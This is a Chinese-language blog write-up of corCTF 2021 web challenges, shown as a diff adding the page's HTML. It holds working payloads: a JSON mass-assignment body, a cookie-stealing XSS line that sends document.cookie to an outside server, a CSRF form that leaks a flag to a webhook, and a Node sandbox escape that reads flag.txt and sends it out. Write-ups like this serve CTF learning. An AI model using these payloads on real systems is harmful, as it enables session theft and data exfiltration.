@@ -1,0 +1,413 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>太无聊了还是写题🐱‍👓 | upload</title><meta name="author" content="upload"><meta name="copyright" content="upload"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="🐱‍👓🐱‍👓🐱‍👓🐱‍👓🐱‍👓🐱‍👓🐱‍👓 喵喵喵喵喵！corCTF 2021">
+<meta property="og:type" content="article">
+<meta property="og:title" content="太无聊了还是写题🐱‍👓">
+<meta property="og:url" content="http://upload.love/2021/08/23/%E5%A4%AA%E6%97%A0%E8%81%8A%E4%BA%86%E8%BF%98%E6%98%AF%E5%86%99%E9%A2%98%E6%8A%8A/index.html">
+<meta property="og:site_name" content="upload">
+<meta property="og:description" content="🐱‍👓🐱‍👓🐱‍👓🐱‍👓🐱‍👓🐱‍👓🐱‍👓 喵喵喵喵喵！corCTF 2021">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://upload.love/image/buu.png">
+<meta property="article:published_time" content="2021-08-23T09:57:57.000Z">
+<meta property="article:modified_time" content="2021-08-25T03:39:50.000Z">
+<meta property="article:author" content="upload">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://upload.love/image/buu.png"><link rel="shortcut icon" href="/%E7%94%B7%E5%AD%A9.png"><link rel="canonical" href="http://upload.love/2021/08/23/%E5%A4%AA%E6%97%A0%E8%81%8A%E4%BA%86%E8%BF%98%E6%98%AF%E5%86%99%E9%A2%98%E6%8A%8A/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}
+
+// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
+const getScript = url => new Promise((resolve, reject) => {
+  const script = document.createElement('script')
+  script.src = url
+  script.async = true
+  script.onerror = reject
+  script.onload = script.onreadystatechange = function() {
+    const loadState = this.readyState
+    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+    script.onload = script.onreadystatechange = null
+    resolve()
+  }
+  document.head.appendChild(script)
+})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-08-25 11:39:50'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'true'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="upload" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" data-lazy-src="/image/pp.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">196</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">136</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">17</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> ♥♥♥</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/2.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">upload</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> ♥♥♥</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">太无聊了还是写题🐱‍👓</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-08-23T09:57:57.000Z" title="发表于 2021-08-23 17:57:57">2021-08-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-08-25T03:39:50.000Z" title="更新于 2021-08-25 11:39:50">2021-08-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctftime/">ctftime</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">891</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>4分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="corCTF-2021"><a href="#corCTF-2021" class="headerlink" title="corCTF 2021"></a>corCTF 2021</h1><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><p><code>an ex-google, ex-facebook tech lead recommended me this book!</code></p>
+<p><code>nodejs</code></p>
+<h2 id="devme"><a href="#devme" class="headerlink" title="devme"></a><code>devme</code></h2><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210823180859.png" alt="image-20210823180858928"></p>
+<p>学到了！</p>
+<p><code>https://graphql.cn/</code></p>
+<p><code>一种用于 API 的查询语言</code></p>
+<p><code>GraphQL 既是一种用于 API 的查询语言也是一个满足你数据查询的运行时。 GraphQL 对你的 API 中的数据提供了一套易于理解的完整描述，使得客户端能够准确地获得它需要的数据，而且没有任何冗余，也让 API 更容易地随着时间推移而演进，还能用于构建强大的开发者工具。</code></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210823193723.png" alt="image-20210823193723647"></p>
+<h2 id="buyme"><a href="#buyme" class="headerlink" title="buyme"></a><code>buyme</code></h2><p>知识点：<code>nodejs小trick</code></p>
+<p>I made a new site to buy flags! But no hoarding, okay :</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210823181022.png" alt="image-20210823181011469"></p>
+<p><code>*hbs*是Express提供的默认视图引擎</code></p>
+<p>首先：<br>就几个路由：</p>
+<p><code>/buy</code></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210823190633.png" alt="image-20210823190632959"></p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">db.buyFlag(&#123; <span class="attr">user</span>: req.user, ...req.body &#125;);</span><br></pre></td></tr></table></figure>
+
+<p>调用<code>db.buyFlag</code>使用<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Spread_syntax#spread_in_object_literals">扩展运算符</a> <code>...req.body</code>，但在设置用户属性后使用。这允许用户属性被 的内容覆盖<code>req.body</code>。<code>req.body</code>只是请求体，所以我们可以任意设置用户。</p>
+<p>大佬：</p>
+<p><code>https://tplant.com.au/blog/corctf-2021/#webbuyme</code></p>
+<p>啥意思呢：<br>就是：我们设置用户后！ 但可以<code>req.body</code>！ 通过<code>req.body</code> 去覆盖原来用户的数据！</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">application/json</span><br><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;flag&quot;</span>:  <span class="string">&quot;corCTF&quot;</span>,</span><br><span class="line">    <span class="string">&quot;user&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;user&quot;</span>:<span class="string">&quot;a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;money&quot;</span>:<span class="number">1e+700</span>,</span><br><span class="line">        <span class="string">&quot;flags&quot;</span>:[]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210823192125.png" alt="image-20210823192125124"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210823192636.png" alt="image-20210823192622173"></p>
+<h2 id="phpme"><a href="#phpme" class="headerlink" title="phpme"></a><code>phpme</code></h2><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210823195316.png" alt="image-20210823194211559"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;secret.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// https://stackoverflow.com/a/6041773</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isJSON</span>(<span class="params">$string</span>) </span>&#123;</span><br><span class="line">        json_decode($string);</span><br><span class="line">        <span class="keyword">return</span> json_last_error() === JSON_ERROR_NONE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($_SERVER[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;secret&#x27;</span>]) &amp;&amp; $_COOKIE[<span class="string">&#x27;secret&#x27;</span>] === $secret) &#123;</span><br><span class="line">            <span class="comment">// https://stackoverflow.com/a/7084677</span></span><br><span class="line">            $body = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span>(isJSON($body) &amp;&amp; is_object(json_decode($body))) &#123;</span><br><span class="line">                $json = json_decode($body, <span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>($json[<span class="string">&quot;yep&quot;</span>]) &amp;&amp; $json[<span class="string">&quot;yep&quot;</span>] === <span class="string">&quot;yep yep yep&quot;</span> &amp;&amp; <span class="keyword">isset</span>($json[<span class="string">&quot;url&quot;</span>])) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;\n&quot;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;    let url = &#x27;&quot;</span> . htmlspecialchars($json[<span class="string">&quot;url&quot;</span>]) . <span class="string">&quot;&#x27;;\n&quot;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;    navigator.sendBeacon(url, &#x27;&quot;</span> . htmlspecialchars($flag) . <span class="string">&quot;&#x27;);\n&quot;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;/script&gt;\n&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;nope :)&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;not json bro&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ur not admin!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>vps上xss.php</code></p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">document</span>.location=<span class="string">&#x27;http://47.94.0.250/cookie.php?cookie=&#x27;</span>+<span class="built_in">document</span>.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210823202737.png" alt="image-20210823202737176"></p>
+<p>感觉这题有点笨笨！啥呀！😖😖😖😖</p>
+<p><code>vps上方放</code></p>
+<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line"> </span><br><span class="line">&lt;form id=<span class="string">&quot;f&quot;</span> enctype=<span class="string">&#x27;text/plain&#x27;</span> action=<span class="string">&quot;https://phpme.be.ax/&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">&lt;input</span><br><span class="line">    name=<span class="string">&#x27;&#123;&quot;yesp&quot;:&quot;&#x27;</span></span><br><span class="line">    value=<span class="string">&#x27;a&quot;,&quot;yep&quot;:&quot;yep yep yep&quot;,&quot;url&quot;:&quot;https://webhook.site/31d1e4a0-1abe-4fe8-8dd9-b7fedf6387db/&quot;&#125;&#x27;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;f.submit()&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="drinkme"><a href="#drinkme" class="headerlink" title="drinkme"></a><code>drinkme</code></h2><p>ssti！</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">app.secret_key &#x3D; b&#39;537472656c6c6963206973206d79206661766f72697465206d656d626572206f6620436f52&#39; # Don&#39;t bother trying to exploit - this is just to get flash() to work because I&#39;m too lazy to make proper error messages</span><br></pre></td></tr></table></figure>
+
+<p>可以随意上传文件！ 但是怎么ssti呢！</p>
+<p>不懂！一开始以为就是上传个模板可以解析呢！ </p>
+<p>但是代码里也就只有上传功能！ 试了试！果然就只能上传，没啥用了！</p>
+<p>不知道 干啥了！😣😣😣</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210824200528.png" alt="image-20210824200521789"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210824200539.png" alt="image-20210824200539560"></p>
+<h2 id="readme"><a href="#readme" class="headerlink" title="readme"></a><code>readme</code></h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;pls summarize <span class="built_in">this</span>&lt;/h1&gt;</span><br><span class="line">        &lt;h1&gt;pls summarize <span class="built_in">this</span>&lt;/h1&gt;</span><br><span class="line">        &lt;h1&gt;pls summarize <span class="built_in">this</span>&lt;/h1&gt;</span><br><span class="line">        &lt;h1&gt;pls summarize <span class="built_in">this</span>&lt;/h1&gt;</span><br><span class="line">        &lt;h1&gt;pls summarize <span class="built_in">this</span>&lt;/h1&gt;</span><br><span class="line">        &lt;button <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;next&quot;</span> onclick=<span class="string">&quot;const ForeignFunction = this.constructor.constructor;const process = ForeignFunction(&#x27;return process&#x27;)(); const require = process.mainModule.require; require(&#x27;http&#x27;).get(&#x27;http://webhook.x.pipedream.net/?q=&#x27; + require(&#x27;fs&#x27;).readFileSync(&#x27;flag.txt&#x27;));&quot;</span>&gt;next&lt;/button&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210825104102.png" alt="image-20210825104102632"></p>
+<h2 id="mathme"><a href="#mathme" class="headerlink" title="mathme"></a><strong>mathme</strong></h2><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210825105302.png" alt="image-20210825105302773"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210825110623.png" alt="image-20210825110623275"></p>
+<p>我我我我！直接0day！这也太猛了把！😒😒😒   </p>
+<p>就是只要是admin就可以了！ 就行不知道怎么变成admin!</p>
+<p>好难呀！这些题！晕了！ 回去玩buu去了！太难了！</p>
+<h1 id="大佬"><a href="#大佬" class="headerlink" title="大佬"></a>大佬</h1><p><code>https://blog.brycec.me/posts/corctf_2021_challenges/#readme</code></p>
+<p><code>https://tplant.com.au/blog/corctf-2021/#webbuyme</code></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">upload</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://upload.love/2021/08/23/%E5%A4%AA%E6%97%A0%E8%81%8A%E4%BA%86%E8%BF%98%E6%98%AF%E5%86%99%E9%A2%98%E6%8A%8A/">http://upload.love/2021/08/23/%E5%A4%AA%E6%97%A0%E8%81%8A%E4%BA%86%E8%BF%98%E6%98%AF%E5%86%99%E9%A2%98%E6%8A%8A/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://upload.love" target="_blank">upload</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/image/buu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/08/25/%E5%BF%AB%E5%86%99%E5%AE%8C%E4%BA%86%E5%BF%AB%E4%BA%86%F0%9F%98%96%F0%9F%98%96%F0%9F%98%96/"><img class="prev-cover" data-lazy-src="/image/buu.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">快写完了快了😖😖😖</div></div></a></div><div class="next-post pull-right"><a href="/2021/08/23/%E7%A5%A5%E4%BA%91%E6%9D%AF2021-1/"><img class="next-cover" data-lazy-src="/image/buu.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">祥云杯2021</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" data-lazy-src="/image/pp.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">upload</div><div class="author-info__description">每天都要开心</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">196</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">136</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">17</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://tcyba.github.io/"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/tcyba" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2384372932@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">我希望我以后每天都能开开心心！</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#corCTF-2021"><span class="toc-number">1.</span> <span class="toc-text">corCTF 2021</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-number">2.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#devme"><span class="toc-number">2.1.</span> <span class="toc-text">devme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#buyme"><span class="toc-number">2.2.</span> <span class="toc-text">buyme</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-number">2.2.1.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpme"><span class="toc-number">2.3.</span> <span class="toc-text">phpme</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload-1"><span class="toc-number">2.3.1.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#drinkme"><span class="toc-number">2.4.</span> <span class="toc-text">drinkme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#readme"><span class="toc-number">2.5.</span> <span class="toc-text">readme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mathme"><span class="toc-number">2.6.</span> <span class="toc-text">mathme</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%A7%E4%BD%AC"><span class="toc-number">3.</span> <span class="toc-text">大佬</span></a></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/11/08/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A14/" title="java代码审计4"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java代码审计4"/></a><div class="content"><a class="title" href="/2021/11/08/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A14/" title="java代码审计4">java代码审计4</a><time datetime="2021-11-08T08:49:09.000Z" title="发表于 2021-11-08 16:49:09">2021-11-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/05/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A13/" title="java代码审计3"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java代码审计3"/></a><div class="content"><a class="title" 